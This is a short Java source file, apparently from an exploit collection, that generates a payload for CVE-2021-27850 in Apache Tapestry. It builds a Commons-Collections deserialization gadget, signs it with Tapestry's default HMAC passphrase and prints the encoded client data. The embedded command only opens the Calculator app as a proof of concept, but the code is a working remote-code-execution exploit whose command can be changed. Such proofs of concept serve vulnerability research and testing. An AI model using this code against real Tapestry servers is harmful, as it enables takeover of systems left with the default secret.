package org.example.payload;

import org.apache.tapestry5.internal.services.ClientDataEncoderImpl;
import org.apache.tapestry5.internal.services.URLEncoderImpl;
import org.apache.tapestry5.services.ClientDataSink;

import java.io.ObjectOutputStream;

/**
 * @author Whoopsunix
 *  CVE-2021-27850
 */
public class CVE_2021_27850 {
    public static void main(String[] args) throws Exception{
        Object object = Serializer.cc6("open -a Calculator.app");
        String HMAC_PASSPHRASE = "change this immediately";

        URLEncoderImpl urlEncoder = new URLEncoderImpl();
        ClientDataEncoderImpl clientDataEncoder = new ClientDataEncoderImpl(urlEncoder, HMAC_PASSPHRASE, null, null, null);
        ClientDataSink clientDataSink = clientDataEncoder.createSink();
        ObjectOutputStream objectOutputStream = clientDataSink.getObjectOutputStream();
        objectOutputStream.writeUTF("UTF-8");
        objectOutputStream.writeBoolean(false);
        objectOutputStream.writeObject(object);
        String payload = clientDataSink.getClientData();
        System.out.println(payload);
    }
}
